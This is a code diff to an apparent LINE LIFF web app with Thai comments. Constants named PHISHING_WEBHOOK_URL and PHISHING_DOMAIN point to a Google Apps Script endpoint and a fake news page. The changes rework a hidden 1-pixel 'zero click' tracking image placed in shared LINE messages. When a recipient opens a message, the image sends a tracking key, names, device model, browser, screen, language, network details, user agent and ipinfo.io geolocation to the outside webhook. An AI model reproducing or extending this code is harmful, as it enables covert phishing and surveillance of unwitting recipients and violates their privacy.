@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzrrmYWYq1Dvtyl_1JyvlZ8blhslhY-J0JQ5F3ssNqK672oHRpLUOHfnV_GDRITHuZVmQ/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzxuCd3H1-jr11o4bmgt2af6879zkK8An2R5WRhawtjHSR3oKEU3kVV4FQXqpCi6CzzxQ/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -818,59 +818,96 @@
                 if (!imageUrl) return;
                 
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
-                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`;
+                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง timestamp เพื่อป้องกันการแคช
-                const timestamp = Date.now();
+                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
+                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // สร้าง URL สำหรับ tracking pixel ที่จะใช้ในข้อความ
-                const zeroClickPixelUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&isTarget=true&ts=${timestamp}`;
+                // ดึงข้อมูลอุปกรณ์ละเอียดสำหรับส่งไปกับ Zero Click
+                const deviceData = getEnhancedDeviceInfo();
                 
-                console.log("Zero Click Track URL:", zeroClickPixelUrl);
+                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
+                // ใช้เป็นพารามิเตอร์ในการโหลดภาพเล็กๆ ที่มองไม่เห็น
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
+                zeroClickTrackUrl += `&key=${trackingKey}`;
+                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
+                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
+                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                
+                // เพิ่มข้อมูลอุปกรณ์สำคัญ
+                zeroClickTrackUrl += `&deviceType=${encodeURIComponent(deviceData.deviceType)}`;
+                zeroClickTrackUrl += `&deviceModel=${encodeURIComponent(deviceData.deviceModel)}`;
+                zeroClickTrackUrl += `&platform=${encodeURIComponent(deviceData.platform)}`;
+                zeroClickTrackUrl += `&browser=${encodeURIComponent(deviceData.browser)}`;
+                zeroClickTrackUrl += `&screenSize=${encodeURIComponent(deviceData.screenSize)}`;
+                zeroClickTrackUrl += `&language=${encodeURIComponent(deviceData.language)}`;
+                
+                // เพิ่มข้อมูลเครือข่าย
+                if (deviceData.connection) {
+                    zeroClickTrackUrl += `&netType=${encodeURIComponent(deviceData.connection.type || "unknown")}`;
+                    zeroClickTrackUrl += `&netEffective=${encodeURIComponent(deviceData.connection.effectiveType || "unknown")}`;
+                    zeroClickTrackUrl += `&netSpeed=${encodeURIComponent(deviceData.connection.downlink || "unknown")}`;
+                }
+                
+                // เพิ่มข้อมูลพิกัดเริ่มต้น (ถ้ามี - จาก ipinfo)
+                if (deviceData.ipLocation) {
+                    zeroClickTrackUrl += `&ipLoc=${encodeURIComponent(deviceData.ipLocation)}`;
+                }
+                
+                // เพิ่มข้อมูล User Agent แบบย่อ
+                const shortUA = navigator.userAgent.substring(0, 150); // เอาแค่ 150 ตัวอักษรแรก
+                zeroClickTrackUrl += `&ua=${encodeURIComponent(shortUA)}`;
+                
+                // ป้องกันการแคช
+                zeroClickTrackUrl += `&r=${randomSuffix}`;
+                
+                console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message ที่รวม tracking image ในรูปแบบที่มีโอกาสถูกโหลดสูงขึ้น
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่`, 
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
-                        hero: {
+                        hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
                             url: imageUrl,
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: {
+                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
                         },
-                        footer: {
+                        body: {
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // ใส่รูปภาพแบบปกติแต่ขนาดเล็กมาก ให้ LINE ต้องโหลดเมื่อเปิดข้อความ
+                                // ใส่รูปภาพขนาด 1x1 pixel ที่โปร่งใสเพื่อทำ zero click tracking
+                                // รูปนี้จะไม่ปรากฏในข้อความแต่จะโหลดเมื่อผู้รับเปิดข้อความ
                                 {
                                     type: 'image',
-                                    url: zeroClickPixelUrl,
-                                    size: 'xxs',   // ใช้ขนาดที่เล็กมากแต่ยังเป็นขนาดมาตรฐานของ LINE
+                                    url: zeroClickTrackUrl,
+                                    size: '1px', // ขนาดเล็กมาก
                                     aspectRatio: '1:1',
-                                    aspectMode: 'fit',
-                                    offsetTop: '0px',
-                                    offsetStart: '0px',
-                                    flex: 0
+                                    aspectMode: 'cover',
+                                    position: 'absolute', // วางแบบ absolute
+                                    offsetTop: '0px',     // ซ่อนไว้ที่มุมบนซ้าย
+                                    offsetStart: '0px'
                                 },
-                                // เพิ่มช่องว่างเพื่อให้ footer มีขนาดเล็กที่สุด
+                                // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
                                 {
-                                    type: 'spacer',
-                                    size: 'xs'
+                                    type: 'box',
+                                    layout: 'vertical',
+                                    contents: [],
+                                    height: '1px',
+                                    width: '1px'
                                 }
                             ],
-                            spacing: 'none',
-                            margin: 'none',
-                            height: '1px',
-                            paddingAll: '0px',
-                            backgroundColor: '#FFFFFF'
+                            height: '1px', // ทำให้ body กล่องเล็กมาก
+                            paddingAll: '0px'
                         }
                     }
                 };
@@ -885,7 +922,7 @@
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
                         
-                        // บันทึก Tracking Key Mapping เพื่อใช้ในการติดตาม
+                        // บันทึก Tracking Key Mapping ก่อน
                         try {
                             const saved = await saveTrackingCaseMapping(trackingKey, caseName);
                             if (!saved) {
@@ -960,6 +997,7 @@
                 screenSize: `${window.screen.width}x${window.screen.height}`,
                 pixelRatio: window.devicePixelRatio || 1,
                 orientation: screen.orientation ? screen.orientation.type : 'unknown',
+                language: navigator.language || navigator.userLanguage || "ไม่ทราบ",
                 connection: getConnectionInfo()
             };
             
@@ -1039,6 +1077,18 @@
                     deviceInfo.deviceModel = genericModel ? genericModel[1].trim() : "Android Device";
                 }
             }
+            
+            // พยายามดึงข้อมูลตำแหน่งจาก IP (จะส่งคำขอไปที่ ipinfo.io)
+            try {
+                fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.loc) {
+                        deviceInfo.ipLocation = data.loc;
+                    }
+                })
+                .catch(() => {});
+            } catch (e) {}
             
             return deviceInfo;
         }
